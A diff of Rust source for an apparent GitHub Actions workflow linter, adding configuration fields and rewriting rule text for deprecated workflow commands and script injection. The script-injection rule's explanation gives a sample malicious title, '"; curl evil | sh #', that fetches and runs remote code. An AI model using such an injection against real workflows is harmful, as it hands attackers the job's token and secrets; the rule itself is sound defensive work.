@@ -32,6 +32,8 @@ static SCRIPTS: KeyEmbeds = KeyEmbeds {
             guess: Some(("jobs.$1.runs-on", "windows", "powershell")),
             language: "shell",
             when: None,
+            settings: &[],
+            unless: None,
         },
         KeyEmbed {
             path: "runs.steps.*.run",
@@ -39,6 +41,8 @@ static SCRIPTS: KeyEmbeds = KeyEmbeds {
             guess: None,
             language: "shell",
             when: None,
+            settings: &[],
+            unless: None,
         },
         KeyEmbed {
             path: "jobs.*.steps.*.with.script",
@@ -46,6 +50,8 @@ static SCRIPTS: KeyEmbeds = KeyEmbeds {
             guess: None,
             language: "",
             when: Some(("jobs.$1.steps.$2.uses", "actions/github-script")),
+            settings: &[],
+            unless: None,
         },
         KeyEmbed {
             path: "runs.steps.*.with.script",
@@ -53,6 +59,8 @@ static SCRIPTS: KeyEmbeds = KeyEmbeds {
             guess: None,
             language: "",
             when: Some(("runs.steps.$1.uses", "actions/github-script")),
+            settings: &[],
+            unless: None,
         },
     ],
     languages: &[
@@ -63,6 +71,9 @@ static SCRIPTS: KeyEmbeds = KeyEmbeds {
     plain: "Plain",
     block_header: "BlockHeader",
     literal: "|",
+    escaped: false,
+    format: false,
+    foreign: None,
 };
 
 /// Every `run` script of the steps of the workflow's jobs and of a composite action, as regions;
@@ -97,9 +108,12 @@ rule! {
         id: "deprecated-commands",
         category: Correctness,
         default: Error,
-        description: "A script uses a workflow command that GitHub has disabled (`::set-output`, \
-                  `::save-state`, `::set-env`, `::add-path`); write to `$GITHUB_OUTPUT`, \
-                  `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` instead.",
+        description: "Reports a script that uses a workflow command that GitHub has disabled or deprecated: `::set-output`, `::save-state`, `::set-env` or `::add-path`.",
+        why: "GitHub disabled `set-env` and `add-path` because any tool that prints a line to the \
+                  log could set an environment variable or change the `PATH` of the job, so those two no longer work. `set-output` and `save-state` have the same weakness, are deprecated and make the run show a warning.\n\
+                  To fix, append to the file the runner provides: `echo \"name=value\" >> \
+                  \"$GITHUB_OUTPUT\"`, and `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` for the \
+                  others.",
         example: "steps:\n  - run: echo \"::set-output name=v::1\"   # reported",
     }
 
@@ -182,10 +196,14 @@ rule! {
         id: "script-injection",
         category: Correctness,
         default: Warn,
-        description: "An expression in a `run` script reads text that an attacker can choose (an \
-                  issue or pull request title, a branch name, a commit message): it is pasted \
-                  into the script before the shell runs, so it can inject commands. Pass it \
-                  through an environment variable (`env:`) and read `\"$VAR\"` instead.",
+        description: "Reports an expression in a `run` script that reads text that an attacker can choose, \
+                  such as the title or body of an issue or pull request, a branch name or a commit \
+                  message.",
+        why: "The runner replaces the `${{ }}` expression with its value before the shell sees the \
+                  script. A title like `\"; curl evil | sh #` becomes part of the script and runs with \
+                  the job's token and secrets.\n\
+                  To fix, pass the value through an environment variable (`env:`) and read `\"$VAR\"` in \
+                  the script.",
         example: "steps:\n  - run: echo \"${{ github.event.issue.title }}\"   # reported",
     }
 
